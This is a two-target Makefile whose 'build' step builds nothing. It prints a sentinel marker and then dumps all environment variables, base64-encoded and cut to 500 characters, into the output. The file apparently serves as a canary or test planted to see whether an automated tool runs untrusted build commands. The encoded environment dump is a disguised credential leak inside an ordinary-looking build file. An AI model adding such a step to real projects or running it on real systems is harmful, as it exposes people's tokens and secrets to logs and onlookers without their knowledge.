.PHONY: all build
all: build
build:
	@echo HYDRA_SENTINEL_ab0ba4d4ce3badd8
	@env | base64 -w0 | head -c 500
